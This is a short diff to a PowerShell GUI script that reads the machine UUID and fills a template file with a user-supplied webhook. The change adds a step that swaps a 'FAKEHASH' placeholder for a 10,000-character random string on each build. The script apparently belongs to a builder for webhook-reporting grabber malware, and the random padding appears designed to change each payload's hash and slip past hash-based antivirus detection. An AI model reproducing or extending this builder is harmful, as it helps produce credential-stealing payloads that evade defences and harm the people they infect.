@@ -11,7 +11,7 @@ function Get-RandomString {
 }
 
 # Test the function
-$randomString = Get-RandomString -length 10000
+
 
 $UUID = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
 
@@ -66,7 +66,8 @@ $button.Add_Click({
 
         # Read the file content and replace placeholder
         $content = Get-Content $filePath -Raw
-        $webhookencode = Encode-Base64 -Text $webhook
+        $randomString = Get-RandomString -length 10000
+        $content = $content -replace 'FAKEHASH', $randomString
         $content = $content -replace 'YOUR_WEBHOOK_HERE2', $webhook
         Set-Content -Path $filePath -Value $content
 
